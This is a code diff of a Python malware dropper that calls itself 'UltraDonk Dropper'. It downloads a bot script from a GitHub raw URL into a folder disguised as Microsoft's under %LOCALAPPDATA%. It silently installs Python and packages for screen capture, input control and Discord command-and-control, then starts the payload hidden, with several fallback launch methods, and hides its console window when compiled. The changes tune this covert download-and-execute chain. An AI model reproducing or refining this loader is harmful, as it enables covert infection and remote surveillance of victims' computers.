@@ -120,28 +120,43 @@ def get_python_path():
     
     return None
 
-def decode_base64_token(encoded_token):
-    """Decode Base64 encoded bot token"""
-    try:
-        # Add padding if needed
-        padding = 4 - len(encoded_token) % 4
-        if padding != 4:
-            encoded_token += '=' * padding
+def run_bot_directly(python_exe, bot_file_path, encoded_bot_token):
+    """Run the bot using multiple methods to ensure it starts"""
+    methods = [
+        # Method 1: Standard hidden process
+        lambda: subprocess.Popen([
+            python_exe, bot_file_path, encoded_bot_token
+        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL),
         
-        decoded_bytes = base64.b64decode(encoded_token)
-        return decoded_bytes.decode('utf-8')
-    except Exception as e:
-        print(f"❌ Token decoding failed: {e}")
-        return None
+        # Method 2: With CREATE_NO_WINDOW flag
+        lambda: subprocess.Popen([
+            python_exe, bot_file_path, encoded_bot_token
+        ], creationflags=subprocess.CREATE_NO_WINDOW),
+        
+        # Method 3: Using start with hidden window
+        lambda: subprocess.Popen([
+            "cmd", "/c", "start", "/B", python_exe, bot_file_path, encoded_bot_token
+        ]),
+    ]
+    
+    for i, method in enumerate(methods, 1):
+        try:
+            print(f"🔄 Trying method {i} to start bot...")
+            process = method()
+            time.sleep(3)  # Give it time to start
+            
+            if process.poll() is None:  # Process is still running
+                print(f"✅ Bot started successfully with method {i} (PID: {process.pid})")
+                return True
+            else:
+                print(f"❌ Method {i} failed - process exited")
+        except Exception as e:
+            print(f"❌ Method {i} failed: {e}")
+    
+    return False
 
 def download_and_run_bot(encoded_bot_token, github_raw_url):
     """Download the main bot Python file from GitHub and run it"""
-    # Decode the bot token first
-    print("🔐 Decoding bot token...")
-    bot_token = decode_base64_token(encoded_bot_token)
-    if not bot_token:
-        return False
-    
     # Download location in %LOCALAPPDATA%
     local_appdata = os.environ.get('LOCALAPPDATA', '')
     bot_directory = os.path.join(local_appdata, "Microsoft", "BotApp")
@@ -153,100 +168,68 @@ def download_and_run_bot(encoded_bot_token, github_raw_url):
     if not download_file(github_raw_url, bot_file_path):
         return False
     
+    # Verify the file was downloaded
+    if not os.path.exists(bot_file_path):
+        print("❌ Bot file was not created")
+        return False
+        
+    print(f"✅ Bot file downloaded to: {bot_file_path}")
+    print(f"📁 File size: {os.path.getsize(bot_file_path)} bytes")
+    
     # Get Python path
     python_exe = get_python_path()
     if not python_exe or not os.path.exists(python_exe):
         print("❌ Python not found after installation")
         return False
     
+    print(f"🐍 Using Python: {python_exe}")
+    
     # Install required packages
     print("📦 Installing required packages...")
-    try:
-        # Run pip install with hidden window
-        startupinfo = subprocess.STARTUPINFO()
-        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-        startupinfo.wShowWindow = 0
-        
-        subprocess.run([
-            python_exe, "-m", "pip", "install", 
-            "discord.py", "pyautogui", "opencv-python", "numpy", 
-            "pywin32", "pygame", "pycaw", "pillow", "pycryptodome",
-            "comtypes", "requests", "pyscreeze", "mss", "psutil"
-        ], check=True, startupinfo=startupinfo, timeout=120)
-        print("✅ Packages installed successfully")
-    except subprocess.TimeoutExpired:
-        print("⚠️ Package installation timed out, continuing...")
-    except Exception as e:
-        print(f"⚠️ Package installation had issues: {e}")
+    packages = [
+        "discord.py", "pyautogui", "opencv-python", "numpy", 
+        "pywin32", "pygame", "pycaw", "pillow", "pycryptodome",
+        "comtypes", "requests", "pyscreeze", "mss", "psutil"
+    ]
     
-    # Modify the bot file to include the token
-    print("🔧 Configuring bot...")
-    try:
-        # Try different encodings to read the file
-        encodings = ['utf-8', 'latin-1', 'cp1252']
-        content = None
-        
-        for encoding in encodings:
-            try:
-                with open(bot_file_path, 'r', encoding=encoding) as f:
-                    content = f.read()
-                print(f"✅ File read successfully with {encoding} encoding")
-                break
-            except UnicodeDecodeError:
-                continue
-        
-        if content is None:
-            print("❌ Could not read file with any encoding")
-            return False
-        
-        # Replace the token placeholder with decoded token
-        content = content.replace("bot.run('YOUR_BOT_TOKEN_HERE')", f"bot.run('{bot_token}')")
-        
-        # Write back with UTF-8 encoding
-        with open(bot_file_path, 'w', encoding='utf-8') as f:
-            f.write(content)
-        
-        print("✅ Bot configured successfully")
-    except Exception as e:
-        print(f"❌ Bot configuration failed: {e}")
-        return False
+    for package in packages:
+        try:
+            subprocess.run([
+                python_exe, "-m", "pip", "install", package
+            ], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=60)
+            print(f"✅ Installed {package}")
+        except:
+            print(f"⚠️ Failed to install {package}")
     
-    # Run the bot
+    print("✅ All packages processed")
+    
+    # Run the bot using multiple methods
     print("🚀 Starting main bot...")
-    try:
-        # Run in background without console window
-        startupinfo = subprocess.STARTUPINFO()
-        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-        startupinfo.wShowWindow = 0  # SW_HIDE
-        
-        subprocess.Popen([
-            python_exe, bot_file_path
-        ], cwd=bot_directory, startupinfo=startupinfo)
-        
-        print("✅ Main bot started successfully")
+    if run_bot_directly(python_exe, bot_file_path, encoded_bot_token):
+        print("🤖 Bot is running in background")
         return True
-    except Exception as e:
-        print(f"❌ Failed to start main bot: {e}")
+    else:
+        print("❌ All methods failed to start bot")
         return False
 
 def hide_console():
     """Hide console window if running as EXE"""
     try:
-        # Only hide if we're running as a compiled EXE
-        if hasattr(sys, 'frozen') or not sys.stdout:
+        if hasattr(sys, 'frozen'):
             console_window = ctypes.windll.kernel32.GetConsoleWindow()
             if console_window:
-                ctypes.windll.user32.ShowWindow(console_window, 0)  # SW_HIDE
+                ctypes.windll.user32.ShowWindow(console_window, 0)
     except:
         pass
 
 def main():
     # Configuration - TO BE FILLED BY BUILDER
-    ENCODED_BOT_TOKEN = "YOUR_BASE64_ENCODED_TOKEN_HERE"  # This will be replaced by the builder
-    GITHUB_RAW_URL = "YOUR_GITHUB_RAW_URL_HERE"  # This will be replaced by the builder
+    ENCODED_BOT_TOKEN = "YOUR_BASE64_ENCODED_TOKEN_HERE"
+    GITHUB_RAW_URL = "YOUR_GITHUB_RAW_URL_HERE"
     
-    # Hide console immediately if running as EXE
-    hide_console()
+    # Only hide console when running as compiled EXE
+    if hasattr(sys, 'frozen'):
+        hide_console()
     
     print("🔧 UltraDonk Dropper Starting...")
     print("=" * 50)
@@ -257,19 +240,22 @@ def main():
         print("🐍 Python not found, installing Python 3.10.5...")
         if not install_python():
             print("❌ Python installation failed")
-            # Don't wait for input in silent mode
             return
     
     # Download and run the main bot
     if download_and_run_bot(ENCODED_BOT_TOKEN, GITHUB_RAW_URL):
         print("🎉 Deployment completed successfully!")
-        print("🤖 Main bot is now running in the background")
     else:
         print("❌ Deployment failed")
     
     print("=" * 50)
-    print("🛑 Dropper will exit in 3 seconds...")
-    time.sleep(3)
+    print("🛑 Dropper completed")
+    
+    # Only exit quickly if compiled
+    if hasattr(sys, 'frozen'):
+        time.sleep(1)
+    else:
+        input("Press Enter to exit...")
 
 if __name__ == "__main__":
     main()
